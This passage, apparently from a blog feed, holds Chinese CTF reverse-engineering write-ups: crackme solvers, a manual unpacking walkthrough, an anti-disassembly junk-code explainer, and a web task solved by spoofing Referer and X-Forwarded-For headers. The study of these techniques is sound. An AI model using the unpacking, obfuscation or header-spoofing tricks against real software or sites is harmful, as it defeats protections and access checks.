title="no-strings-attached"></a>no-strings-attached</h4><p>这题有点意思，整个程序没有直接出现的字符串，先打开IDA看看，找到一个decrypt函数，一看就知道这个是最重要的部分，又不想再写脚本去算，所以干脆开虚拟机gdb动态调试，在decrypt处下断点，等运行完decrypt函数之后，发现程序把某个地址拷进了eax，所以用<code>x/6sw $eax</code>来查看，结果发现了flag</p><pre><code>9447&#123;you_are_an_international_mystery&#125;</code></pre><h4 id="csaw2013reversing3"><a href="#csaw2013reversing3" class="headerlink" title="csaw2013reversing3"></a>csaw2013reversing3</h4><p>这题比较有意思，一打开输出的是乱码，用IDA打开发现这些代码没有解密，有一个解密程序但是没有运行，所以OD直接调试改汇编，先运行解密函数，然后跳转到MessageBoxA函数，在窗口中输出来的就是真正的flag，操作比较简单，就不赘述了。</p><pre><code>flag&#123;reversing_is_not_that_hard!&#125;</code></pre><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>见CG-CTF maze</p><h4 id="666"><a href="#666" class="headerlink" title="666"></a>666</h4><p>IDA打开看到了假flag，不管它，找到关键函数</p><pre><code class="c++">int __fastcall encode(const char *a1, __int64 a2)&#123;  char v3[32]; // [rsp+10h] [rbp-70h]  char v4[32]; // [rsp+30h] [rbp-50h]  char v5[40]; // [rsp+50h] [rbp-30h]  int v6; // [rsp+78h] [rbp-8h]  int i; // [rsp+7Ch] [rbp-4h]  i = 0;  v6 = 0;  if ( strlen(a1) != key )    return puts(&quot;Your Length is Wrong&quot;);  for ( i = 0; i &lt; key; i += 3 )  &#123;    v5[i] = key ^ (a1[i] + 6);    v4[i + 1] = (a1[i + 1] - 6) ^ key;    v3[i + 2] = a1[i + 2] ^ 6 ^ key;    *(_BYTE *)(a2 + i) = v5[i];    *(_BYTE *)(a2 + i + 1LL) = v4[i + 1];    *(_BYTE *)(a2 + i + 2LL) = v3[i + 2];  &#125;  return a2;&#125;</code></pre><p>这里进行了一些运算，运算的结果要和一个已经定义的enflag字符串相同，所以很好逆，这里需要注意运算顺序，异或运算加括号，不然会先计算加减</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() &#123;    int key = 0x12;    unsigned char a2[] =            &#123;                    0x69, 0x7A, 0x77, 0x68, 0x72, 0x6F, 0x7A, 0x22, 0x22, 0x77,                    0x22, 0x76, 0x2E, 0x4B, 0x22, 0x2E, 0x4E, 0x69            &#125;;    char a1[key+1];    for (int i = 0; i &lt; key; i += 3 )    &#123;        a1[i]=(a2[i]^key)-6;        a1[i+1]=(a2[i+1]^key)+6;        a1[i+2]=a2[i+2]^key^6;    &#125;    cout&lt;&lt;a1&lt;&lt;endl;    return 0;&#125;</code></pre><p>输出的flag为：</p><pre><code>unctf&#123;b66_6b6_66b&#125;</code></pre><h4 id="Reversing-x64Elf-100"><a href="#Reversing-x64Elf-100" class="headerlink" title="Reversing-x64Elf-100"></a>Reversing-x64Elf-100</h4><p>没什么难度，找到关键函数</p><pre><code class="c++">signed __int64 __fastcall sub_4006FD(__int64 a1)&#123;  signed int i; // [rsp+14h] [rbp-24h]  const char *v3; // [rsp+18h] [rbp-20h]  const char *v4; // [rsp+20h] [rbp-18h]  const char *v5; // [rsp+28h] [rbp-10h]  v3 = &quot;Dufhbmf&quot;;  v4 = &quot;pG`imos&quot;;  v5 = &quot;ewUglpt&quot;;  for ( i = 0; i &lt;= 11; ++i )  &#123;    if ( (&amp;v3)[i % 3][2 * (i / 3)] - *(char *)(i + a1) != 1 )      return 1LL;  &#125;  return 0LL;&#125;</code></pre><p>a1就是我们需要的flag了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() &#123;    char v3[3][8] = &#123;&quot;Dufhbmf&quot;, &quot;pG`imos&quot;, &quot;ewUglpt&quot;&#125;;    char a1[13];    for (int i = 0; i &lt;= 11; ++i) &#123;        a1[i] = v3[i % 3][2 * (i / 3)] - 1;    &#125;    cout&lt;&lt;a1&lt;&lt;endl;    return 0;&#125;</code></pre><p>输出的flag为：</p><pre><code>Code_Talkers</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-crackme-wp（手动脱壳）</title>
      <link href="/2020/02/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crackme-wp%EF%BC%88%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3%EF%BC%89/"/>
      <url>/2020/02/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crackme-wp%EF%BC%88%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这里以攻防世界的一道简单的题目来记录一下手动脱壳相关内容，其实理解了原理之后也是非常简单的一件事。</p><span id="more"></span><p>首先看看攻防世界的这道crackme。</p><h4 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h4><p>PEiD查一查，发现有壳，nSpack，并不是常见的upx，也懒得去找工具，这样一道简单的题目肯定不会用很复杂的壳，所以开始徒手脱壳。</p><p><img src="https://s2.ax1x.com/2020/02/20/3eQuwV.png" alt="crackme-1"></p><h4 id="找OEP"><a href="#找OEP" class="headerlink" title="找OEP"></a>找OEP</h4><p>手动脱壳的第一步，就是要找到程序的OEP，就是真正的程序入口点。这个要从壳的原理说起，所谓的压缩壳、加密壳，作用都是要隐藏程序真正的入口点，在壳加载的过程中对数据进行解压和解密并放到相应的段，然后壳的作用就结束了，这个时候会从壳进入真正的程序，这个时候会有一个真正的程序入口，就是OEP，不管脱什么壳，首先都是要找到OEP。</p><p>首先OD打开调试（不管用什么调试都差不多，IDA也是可以的，并且也有相应的Dump脚本，过程上没什么太大的差别）</p><p><img src="https://s2.ax1x.com/2020/02/20/3eJESU.png" alt="crackme-2"></p><p>首先看到<code>pushfd</code>和<code>pushad</code>两条命令，这是记录所有寄存器，这里我根据<em>esp定律</em>，实际上也就是堆栈平衡的原理，在执行完<code>pushad</code>之后对<code>esp</code>下断点</p><p><img src="https://s2.ax1x.com/2020/02/20/3eJFYV.png" alt="crackme-3"></p><p>下面简单介绍一下<em>esp定律</em>：</p><blockquote><p>一般的加壳软件在执行时，首先要初始化，保存环境（保存各个寄存器的值），一般利用<code>pushad</code>（相当于把<code>eax,ecx,edx,ebx,esp,ebp,esi,edi</code>都压栈），当加壳程序的外壳执行完毕以后，再来恢复各个寄存器的内容，通常会用POPAD（相当与把刚刚保存的寄存器的值都还原），在脱壳的时候，我们可以根据堆栈平衡来对ESP进行下断，进而快速到达OEP</p></blockquote><p>使用硬件读断点（<code>hw esp</code>），这里只经过了两次跳转，然后就来到了OEP附近，这里也需要注意，OEP处的<code>esp</code>并不一定是之前记录的值，但是一定很近了，这个时候需要耐心的寻找疑似的OEP。这里的OEP我找到实在<code>0x401000</code>处</p><p><img src="https://s2.ax1x.com/2020/02/20/3eJkWT.png" alt="crackme-4"></p><p>这里显然就是程序真正的入口。还有一点需要注意，壳加载过程中会加载代码，所以如果遇到没有解析的数据，就<code>Ctrl+A</code>重新分析代码。</p><h4 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h4><p>接下来要把内存中的完整程序Dump出来，好像OD有相关的插件，但我还是喜欢LordPE，使用也很简单，就是注意右键进程，修正镜像大小，因为有人会改镜像的大小，Dump出来的程序会有问题，所以一般不去判断，直接先修正，再Dump</p><h4 id="修正IAT"><a href="#修正IAT" class="headerlink" title="修正IAT"></a>修正IAT</h4><p>这个时候Dump出来的程序时没法运行的，因为缺少了很关键的一部分内容，就是IAT，也就是输入表，我们可以把现在Dump出来的程序用IDA打开，可以看到<code>printf</code>和<code>scanf</code>之类的函数都识别不出来，这就是因为我们Dump出来的程序没有输入表。至于输入表是什么，偷懒从百度百科抄了过来，这是PE结构中很重要的一部分。</p><blockquote><p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中。当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。</p></blockquote><p>IAT当然可以自己动手改Dump出来的程序的16进制，但是我还是喜欢用ImportREC（明明有工具为什么还要自己动手……还容易写错）。</p><p><img src="https://s2.ax1x.com/2020/02/20/3ewXrT.png" alt="crackme-5"></p><p>使用起来很简单，首先要把我们知道的OEP地址输入进去，注意这里是偏移地址，然后可以选择<code>IAT Autosearch</code>选项，但有的时候可能会不准确，这个时候可以手动寻找，RVA就是相对虚拟地址，Size就是大小，手动找的过程也很简单，只要找到调用的函数的部分，比如说<code>printf</code>，就可以在汇编代码里看到调用的地址，比如说<code>dword ptr [402094]</code>，这是个间接取址，这里取的是<code>402094</code>处指针指向的地址，这里才是真正的<code>printf</code>函数的入口，我们转到<code>402094</code>的位置，可以看到上下都有很多这样的指针，指向外部引用的函数，这里就是输入表</p><p><img src="https://s2.ax1x.com/2020/02/20/3erkMq.png" alt="crackme-6"></p><p>两个不同的dll中间用0隔开，所以找到开始地址和结束地址，就能知道RVA和Size。</p><p>这个时候点<code>Get Imports</code>，中间窗口会显示出来，但是注意有时候会出现无效的值，这个时候可能需要手动修复或者是删除，如果全都显示有效，就可以<code>Fix Dump</code>，选择刚刚Dump出来的文件，成功的话会生成一个新的文件，这个文件是可以执行的程序，到这里脱壳的过程就结束了。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>回到题目本身，IDA打开</p><pre><code class="c++">signed int start()&#123;  signed int result; // eax  int v1; // eax  char Buf; // [esp+4h] [ebp-38h]  char Dst; // [esp+5h] [ebp-37h]  Buf = 0;  memset(&amp;Dst, 0, 0x31u);  printf(&quot;Please Input Flag:&quot;);  gets_s(&amp;Buf, 0x2Cu);  if ( strlen(&amp;Buf) == 42 )  &#123;    v1 = 0;    while ( (*(&amp;Buf + v1) ^ byte_402130[v1 % 16]) == dword_402150[v1] )    &#123;      if ( ++v1 &gt;= 42 )      &#123;        printf(&quot;right!\n&quot;);        goto LABEL_8;      &#125;    &#125;    printf(&quot;error!\n&quot;);LABEL_8:    result = 0;  &#125;  else  &#123;    printf(&quot;error!\n&quot;);    result = -1;  &#125;  return result;&#125;</code></pre><p>发现程序的判断非常简单，可见这题的主要目的是为了考脱壳，把需要的数据导出之后，直接简单逆向输出flag</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() &#123;    int dword_402150[] = &#123; 18, 4, 8, 20, 36, 92, 74, 61, 86, 10, 16, 103, 0, 65, 0, 1, 70, 90, 68, 66, 110, 12, 68, 114, 12, 13, 64, 62, 75, 95, 2, 1, 76, 94, 91, 23, 110, 12, 22, 104, 91, 18&#125;;    char aThisIsNotFlag[] =            &quot;this_is_not_flag&quot;;    string flag;    for(int i =0;i&lt;42;i++)    &#123;        flag+=(dword_402150[i]^aThisIsNotFlag[i%16]);    &#125;    cout&lt;&lt;flag&lt;&lt;endl;    return 0;&#125;</code></pre><p>输出得到flag</p><pre><code>flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> 脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令</title>
      <link href="/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><em><strong>年轻人的第一个花指令</strong></em></p><p>这里写一下有关花指令的内容，自己的理解也很有限，只能以后再多学学再补充，现在只能把自己知道的写下来。  </p><span id="more"></span><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>首先反汇编有一个很关键的问题，就是怎么样区分数据和代码，由于x86和x64架构的每条指令是不等长的，区分数据和代码就变得很困难，反汇编的算法必须要对汇编指令长度和各种各样的跳转进行适当的处理，不然就会发生错误，导致反汇编失败，这也是花指令的作用。  </p><p>目前主要的反汇编算法主要还是线性扫描*(Linear Sweep)<em>和较高级的递归行进</em>(Recursive Traversal)*，目前我比较常用的就是OD和IDA，它们的工作原理列在下面，此外还尝试了Ghidra，这个工具比较神奇，可以在有花指令的情况下抛掉很多无用的指令，反汇编出函数的大概，目前工作的原理还没有详细地了解，这里先提一下，了解之后再补充。</p><blockquote><p>线性扫描本身的技术含量不是很高，反汇编工具将整个模块中的每一条指令都反汇编成汇编指令，每一个遇到的机器码都会当作汇编指令处理（不加判断），所以线性扫描根本不能把代码和数据区分开来，而一旦一条指令开始出错，整个反汇编都开始出错。</p></blockquote><blockquote><p>递归行进算法相较于线性扫描算法更灵活一些，它是按照代码可能的执行顺序来反汇编程序，每条可能的路径来扫描，解码出分支之后会记录这个地址，分别反汇编各个分支中的指令，这样按照路径进行搜寻，可以有效避免将数据识别成指令的问题。  </p></blockquote><table><thead><tr><th>工具</th><th>算法</th></tr></thead><tbody><tr><td>OllyDbg</td><td>Linear Sweep/Recursive Traversal(Ctrl+A)</td></tr><tr><td>IDA Pro</td><td>Recursive Traversal</td></tr><tr><td>Ghidra</td><td></td></tr></tbody></table><p>但是我们可以通过巧妙地构造代码和数据，插入一些<em>“花指令”</em>，以此干扰反汇编软件。因为前面提到的不同的机器指令包含的字节数不同地原因，所有的多字节指令只有正确识别第一个字节，也就是操作码，才能正确实现反汇编，否则就会识别成完全不同的另一条指令。</p><p>而迷惑递归行进算法还需要多动动脑子，一两个简单的垃圾数据不会使递归行进算法失效，但是，个人理解，在递归行进算法中，任意的控制转移指令，其后的地址都认为是有效的，因为递归行进算法中最重要的就是通过跳转来确定分支，因此，我们可以利用跳转来实现我们想要的<em>“花指令”</em>。</p><h4 id="常见花指令"><a href="#常见花指令" class="headerlink" title="常见花指令"></a>常见花指令</h4><ul><li><p><code>jx &amp; jnx</code></p><p>比如说这样一段代码</p></li></ul><pre><code class="asm">text:00401065            jz short near ptr loc_40107Ctext:00401067            jnz short near ptr loc_40107Ctext:00401069text:00401069 loc_401069:text:00401069            db 36h  ;junk code heretext:0040107C            ……</code></pre><p>​    这里只是一个随便编写的例子，但是差不多所有的处理都是这个样子，两个互补指令代替了一个强制跳转，但是在IDA这里，没有成功跳转的分支也是默认有效的，所以会去解析<code>junk code</code>，后面的指令也就跟着出错了。</p><ul><li><p><code>call+pop/(add esp)+return</code></p><p>比如说这样的代码</p><pre><code class="asm">text:0040103B        call loc_401042text:0040103B sub_401022    endp;sp-analysis failedtext:0040103Btext:00401040        cmp cl,dltext:00401042text:00401042 loc_401042:text:00401042        add esp,4</code></pre><p><code>call</code>指令相当于<code>jmp</code>+<code>push eip</code>，所以用<code>add esp,4</code>指令可以消除入栈的<code>eip</code>的影响，此时<code>call</code>就相当于<code>jmp</code>，但是IDA还是会把<code>0x401042</code>当作新函数的首地址，所以当前函数的识别就会出错，IDA会找不到结束位置，因此没法继续反汇编。</p></li><li><p><code>jx</code></p><p>这一类理解起来也蛮简单的，就是<code>jmp</code>到一个IDA无法解析的位置，比如说下面这段</p><pre><code class="asm">.text:00000000004009F5 loc_4009F5:                             .text:00000000004009F5                 jmp     short near ptr loc_4009FB+1;---------------------------------------------------------------------------;从这里开始.text:00000000004009F7                 xor     eax, eax.text:00000000004009F9                 jz      short loc_4009F5.text:00000000004009FB.text:00000000004009FB loc_4009FB:                             .text:00000000004009FB                 call    near ptr 0C59748h</code></pre><p>最下面这个<code>0c59748</code>的地址显然是无效的，这里肯定是出了问题，仔细观察一下代码，<code>xor  eax, eax</code>这句得到的是0，所以下一个跳转是一定可以实现的，但是IDA判断不出来，他会对所有可能的分支进行解析，所以会从<code>0x4009FB</code>出开始解析新的命令，然后这个跳转并不存在，就会提示地址不存在，但是真正让反汇编进行不下去的是接下来的操作，另一条可能的路径，即正常的执行流程，进入到<code>0x4009F5</code>之后跳转到了<code>0x4009FC</code>的位置，但是这里已经解析过了，被一条假的命令占用了，IDA就会停止反汇编，然后报错。</p></li><li><p><code>call</code>+一些巧妙的处理</p><p>最近比赛的时候见到了一个很不错的花指令，可以学习一下，在<code>call</code>指令之后写入一些<code>junk code</code>，然后在调用的函数中对返回地址进行处理跳过<code>junk code</code>，详细的过程在<a href="http://blog.rycbar.club/2020/03/30/MRCTF-wp/#junk">这里</a></p></li></ul><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>写花指令的方式实在太多，也有很多很有创意的花指令，记录是记录不完的，但是只要掌握的原理，跟着程序的流程走，都不会有太大的难度，熟练了以后可以尝试使用脚本去除花指令。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 花指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame_wp</title>
      <link href="/2020/01/25/hgame-wp/"/>
      <url>/2020/01/25/hgame-wp/</url>
      
        <content type="html"><![CDATA[<p>记录一下Hgame的部分题解和一些解题时的思路</p><span id="more"></span><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头：</p><pre><code class="http">Referer:https://vidar.club</code></pre><p>然后提示需要从本地访问，添加响应头：</p><pre><code class="http">X-Forwarded-For: 127.0.0.1</code></pre><p>接着提示flag会在2077年更新，所以添加响应头：</p><pre><code class="http">If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT</code></pre><p>再发送请求得到flag</p><pre><code class="flag">hgame&#123;W0w!Your_heads_@re_s0_many!&#125;</code></pre><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>一看题目又是一道迷宫题，拖进IDA反编译</p><pre><code class="c++">v5 = (char *)&amp;unk_6020C4;  while ( (signed int)v4 &lt; SHIDWORD(v4) )  &#123;    v3 = s[(signed int)v4];    if ( v3 == 100 )    &#123;      v5 += 4;    &#125;    else if ( v3 &gt; 100 )    &#123;      if ( v3 == 115 )      &#123;        v5 += 64;      &#125;      else      &#123;        if ( v3 != 119 )        &#123;LABEL_12:          puts(&quot;Illegal input!&quot;);          exit(0);        &#125;        v5 -= 64;      &#125;    &#125;    else    &#123;      if ( v3 != 97 )        goto LABEL_12;      v5 -= 4;    &#125;    if ( v5 &lt; (char *)&amp;unk_602080 || v5 &gt; (char *)&amp;unk_60247C || *(_DWORD *)v5 &amp; 1 )      goto LABEL_22;    LODWORD(v4) = v4 + 1;  &#125;  if ( v5 == (char *)&amp;unk_60243C )  &#123;    sprintf(&amp;v7, &quot;hgame&#123;%s&#125;&quot;, s, v4);    puts(&quot;You win!&quot;);    printf(&quot;Flag is: &quot;);    puts(&amp;v7);    exit(0);  &#125;LABEL_22:  puts(&quot;You died&quot;);  exit(0);</code></pre><p>贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点</p><p><img src="https://s2.ax1x.com/2020/02/13/1qp5rT.png" alt="maze"></p><p>即从（2，2）位置走到（15，16）位置</p><p>所以最后的flag为</p><pre><code class="flag">hgame&#123;ssssddddddsssssddwwdddssssdssdd&#125;</code></pre><h4 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h4><p>这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。</p><p>首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析</p><pre><code class="c++">//只贴出了有用的部分并且稍做了排版void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  char v6; // [rsp+10h] [rbp-60h]  char v7; // [rsp+11h] [rbp-5Fh]  char v8; // [rsp+12h] [rbp-5Eh]  char v9; // [rsp+13h] [rbp-5Dh]  char v10; // [rsp+14h] [rbp-5Ch]  char v11; // [rsp+15h] [rbp-5Bh]  char v12; // [rsp+16h] [rbp-5Ah]  char v13; // [rsp+17h] [rbp-59h]  __int64 v14; // [rsp+20h] [rbp-50h]  char v15; // [rsp+28h] [rbp-48h]  __int64 v16; // [rsp+30h] [rbp-40h]  char v17; // [rsp+38h] [rbp-38h]  char s; // [rsp+40h] [rbp-30h]        //地址是连续的，flag中间的具体内容是v24和v25起始的两个16  char v19; // [rsp+41h] [rbp-2Fh]        //字节  char v20; // [rsp+42h] [rbp-2Eh]  char v21; // [rsp+43h] [rbp-2Dh]  char v22; // [rsp+44h] [rbp-2Ch]  char v23; // [rsp+45h] [rbp-2Bh]  __int16 v24; // [rsp+46h] [rbp-2Ah]  __int16 v25; // [rsp+56h] [rbp-1Ah]  char v26; // [rsp+66h] [rbp-Ah]  sub_4007E6();//只负责输出，没什么功能  v6 = 76;v7 = 60;v8 = 214;v9 = 54;v10 = 80;v11 = 136;v12 = 32;v13 = 204;  __isoc99_scanf(&quot;%39s&quot;, &amp;s);  if ( strlen(&amp;s) == 39 &amp;&amp; s == &#39;h&#39; &amp;&amp; v19 == &#39;g&#39; &amp;&amp; v20 == &#39;a&#39; &amp;&amp; v21 == &#39;m&#39; &amp;&amp; v22 == &#39;e&#39; &amp;&amp; v23 == &#39;&#123;&#39; &amp;&amp; v26 == &#39;&#125;&#39; )// 共39位，hgame&#123;***&#125;格式  &#123;    v14 = 0LL;    v15 = 0;    v16 = 0LL;    v17 = 0;    //这两条命令进行第一部分运算    sub_400616((__int64)&amp;v14, (__int64)&amp;v24);   // 传入地址，对flag中的部分进行操作    sub_400616((__int64)&amp;v16, (__int64)&amp;v25);         //这里开始进行第二部分运算    for ( i = 0; i &lt;= 7; ++i )    &#123;      *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; 0xE0) &gt;&gt; 5) | 8 * *((_BYTE *)&amp;v14 + i);// &amp;v14 + i前三位与后五位交换位置      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或      *((_BYTE *)&amp;v16 + 7 - i) = 2 * (*((_BYTE *)&amp;v14 + i) &amp; 0x55) ^ *((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA | *((_BYTE *)&amp;v16 + 7 - i) &amp; 0x55;// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或    &#125;                                                   //这里进行第三部分运算    for ( j = 0; j &lt;= 7; ++j )    &#123;      *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j);       // v6 = 76;                                                //   v7 = 60;                                                //   v8 = 214;                                                //   v9 = 54;                                                //   v10 = 80;                                                //   v11 = 136;                                                //   v12 = 32;                                                //   v13 = 204;      if ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )// e4sy_Re_      &#123;        puts(&quot;sry, wrong flag&quot;);        exit(0);      &#125;    &#125;    for ( k = 0; k &lt;= 7; ++k )    &#123;      *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k);    // v6 = 76;                                //这里异或之后又变成了V14最初始的值         //   v7 = 60;                                                                    //   v8 = 214;                                                                    //   v9 = 54;                                                                    //   v10 = 80;                                                                    //   v11 = 136;                                                                    //   v12 = 32;                                                                    //   v13 = 204;      if ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )// Easylif3      &#123;        puts(&quot;Just one last step&quot;);        exit(0);      &#125;    &#125;    puts(&quot;Congratulations! You are already familiar with bitwise operation.&quot;);    puts(&quot;Flag is your input.&quot;);    exit(0);  &#125;  puts(&quot;Illegal input!&quot;);  exit(0);&#125;//sub_400616() 第一部分运算所用到的函数_BYTE *__fastcall sub_400616(__int64 a1, __int64 a2)&#123;  _BYTE *result; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; i &lt;= 7; ++i )  &#123;    if ( *(_BYTE *)(2 * i + a2) &lt;= 96 || *(_BYTE *)(2 * i + a2) &gt; 102 )    &#123;      if ( *(_BYTE *)(2 * i + a2) &lt;= 47 || *(_BYTE *)(2 * i + a2) &gt; 57 )      &#123;LABEL_17:        puts(&quot;Illegal input!&quot;);        exit(0);      &#125;      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 48;    &#125;    else    &#123;      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 87;    &#125;    if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 96 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 102 )    &#123;      if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 47 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 57 )        goto LABEL_17;      result = (_BYTE *)(i + a1);      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 48;    &#125;    else    &#123;      result = (_BYTE *)(i + a1);      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 87;    &#125;  &#125;  return result;&#125;//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理</code></pre><p>把整个过程理解清楚之后可以开始写脚本进行一个逆运算了</p><pre><code class="python">#-*- coding:utf-8 -*-# 第三部分逆运算v = [76, 60, 214, 54, 80, 136, 32, 204]v0 = &#39;e4sy_Re_&#39;v14 = []for i in range(len(v0)):    v14.append(ord(v0[i]) ^ v[i])# print(v14)v16 = []v1 = &#39;Easylif3&#39;for i in range(len(v1)):    v16.append(ord(v1[i]) ^ v14[i])  # v14经过两次和v的异或又变回了原本的值# print(v16)# 第二部分逆运算for i in range(8):    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))    v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))    # print(bin(v16[7-i])[2:].rjust(8, &#39;0&#39;))    v16[7 - i] = (2 * (v14[i] &amp; 0x55) ^ v16[7 - i] &amp; 0xAA | v16[7 - i] &amp; 0x55) % 256    # print(bin(v16[7-i])[2:].rjust(8, &#39;0&#39;))    # print(bin(v14[i])[2:].rjust(8, &#39;0&#39;))    v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256    # print(bin(v14[i])[2:].rjust(8, &#39;0&#39;))    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))    v14[i] = (((v14[i] &amp; 0x1F) &lt;&lt; 5) | ((v14[i] &amp; 0xF8) &gt;&gt; 3)) % 256    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))# print(v14)# print(v16)# 第一部分逆运算v24 = [0 for i in range(16)]v25 = [0 for i in range(16)]alphabet = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]# 字母表不多，逆运算难以进行所以采用遍历的方式进行计算for i in range(8):    for j in alphabet:        if 57 &gt;= j &gt; 47:            tmp = j - 48        else:            tmp = j - 87        v24[2*i]=j        if 57 &gt;= v14[i] - 16 * tmp + 48 &gt; 47:            v24[2 * i + 1] = v14[i] - 16 * tmp + 48            break        elif 102 &gt;= v14[i] - 16 * tmp + 87 &gt; 96:            v24[2 * i + 1] = v14[i] - 16 * tmp + 87            break        else:            continuefor i in range(8):    for j in alphabet:        v25[2 * i] = j        if 57 &gt;= j &gt; 47:            tmp = j - 48        else:            tmp = j - 87        if 102 &gt;= v16[i] - 16 * tmp + 87 &gt; 96:            v25[2 * i + 1] = v16[i] - 16 * tmp + 87            break        elif 57 &gt;= v16[i] - 16 * tmp + 48 &gt; 47:            v25[2 * i + 1] = v16[i] - 16 * tmp + 48            break        else:            continue# print(v24)# print(v25)flag = &#39;hgame&#123;&#39;+&#39;&#39;.join([chr(v24[i]) for i in range(16)]) + &#39;&#39;.join([chr(v25[i]) for i in range(16)])+&#39;&#125;&#39;print(flag)</code></pre><p>输出得到flag</p><pre><code class="flag">hgame&#123;0f233e63637982d266cbf41ecb1b0102&#125;</code></pre><p>到虚拟机上验证一下，发现结果正确</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpqi9.png" alt="bitwise_operation2"></p><h4 id="advance"><a href="#advance" 